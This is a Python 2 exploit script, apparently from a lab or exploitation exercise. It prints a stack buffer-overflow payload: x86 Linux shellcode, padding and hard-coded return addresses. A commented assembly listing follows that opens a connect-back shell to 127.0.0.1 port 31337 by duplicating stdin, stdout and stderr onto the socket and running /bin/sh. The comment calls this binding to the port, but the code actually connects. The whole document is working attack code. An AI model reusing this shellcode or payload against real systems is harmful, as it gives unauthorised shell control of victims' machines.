shellcode =("\xb8\x7f\x01\x01\x01\xba\x11\x11\xfe\xbf\x88\x02\x83\xc2\x01\x88\x02\x29\xc0\x83\xc0\x66\x29\xdb\x43\x29\xc9\x51\x83\xc1\x06\x51\x83\xe9\x05\x51\x41\x51\x89\xe1\xcd\x80\x89\xc2\x29\xc9\x51\x51\x29\xc0\xb8\x90\x11\x11\x12\x2d\x11\x11\x11\x11\x50\x66\x68\x7a\x69\x83\xc1\x02\x66\x51\x89\xe7\x29\xdb\x83\xc3\x10\x53\x57\x52\x89\xe1\x29\xdb\x83\xc3\x03\x29\xc0\x83\xc0\x66\xcd\x80\x29\xc9\x29\xc0\x83\xc0\x3f\x89\xd3\xcd\x80\x29\xc0\x83\xc0\x3f\x89\xd3\xfe\xc1\xcd\x80\x29\xc0\x83\xc0\x3f\x89\xd3\x83\xc1\x02\xcd\x80\x29\xc0\x29\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x29\xc0\x83\xc0\x0b\xcd\x80\x29\xc0\x83\xc0\x01\xcd\x80")

print shellcode+"a"*(2048-len(shellcode))+"\x58\x7f\xfe\xbf"+"\x6c\x87\xfe\xbf"

"""
	;This code binds to a port 31337 via TCP(protocol number is 6) and directs all the
	;stdin(file descriptor=0) and stdout(file descriptor=1) and stderr(file descriptor=2)
	;from the socket to the target machine.  We then open a shell to get control of it.
.global myfunc
myfunc:
	;define the socket arguments
	mov $0xbffe1111,%edx	
	mov %al,(%edx)
	add $1,%edx
	mov %al,(%edx)
	sub %eax,%eax
	add $0x66,%eax	;syscall 102-socketcall
	sub %ebx,%ebx
	inc %ebx	;socketcall type(sys_socket 1)
	sub %ecx,%ecx
	pushl %ecx	
	add $0x6,%ecx	;TCP protocol number=6
	pushl %ecx
	sub $0x5,%ecx	;SOCK_STREAM=1(int)
	pushl %ecx
	inc %ecx	;AF_INET=2(int)
	pushl %ecx
	movl %esp,%ecx	;pointer to the argument array
	int $0x80

	;saving the returned socket file descriptor
	movl %eax,%edx
	sub %ecx,%ecx
	pushl %ecx
	pushl %ecx

	mov $0x12111190,%eax
	sub $0x11111111,%eax	;127.0.0.1 local address
	pushl %eax

	pushw $0x697a	;port 31337(in byte reverse order)
	add $0x02,%ecx
	pushw %cx	;AF_INET=2
	movl %esp,%edi
	sub %ebx,%ebx
	add $0x10,%ebx	;sockaddr_in size=sizeof(struct sockaddr_in)
	pushl %ebx
	pushl %edi
	pushl %edx

	movl %esp,%ecx
	sub %ebx,%ebx
	add $0x3,%ebx

	sub %eax,%eax
	add $0x66,%eax	;syscall 102-socketcall
	int $0x80
	sub %ecx,%ecx
	
	;creating the copy of the 3 file descriptors(stdin,stdout,stderr)

	;stdin
	sub %eax,%eax
	add $0x3f,%eax	;syscall 63 dup2
	movl %edx,%ebx	;;client socket file descriptor
	int $0x80

	;stdout
	sub %eax,%eax
	add $0x3f,%eax	;syscall 63 dup2
	movl %edx,%ebx	;client socket file descriptor
	inc %cl		;stdout file descriptor:1
	int $0x80

	;stderr
	sub %eax,%eax
	add $0x3f,%eax	;syscall 63 dup2
	movl %edx,%ebx	;client socket file descriptor
	add $0x2,%ecx	;stderr file descriptor:2
	int $0x80

	//invoke a system call through int 0x80 to open up a shell
	sub %eax,%eax
	sub %edx,%edx	;//null pointer to envp
	pushl %eax
	pushl $0x68732f6e	;//bin/sh
	pushl $0x69622f2f	

	movl %esp,%ebx
	pushl %eax
	pushl %ebx
	movl %esp,%ecx

	sub %eax,%eax
	add $0xb,%eax	;execve
	int $0x80

	sub %eax,%eax
	add $0x1,%eax
	int $0x80
"""
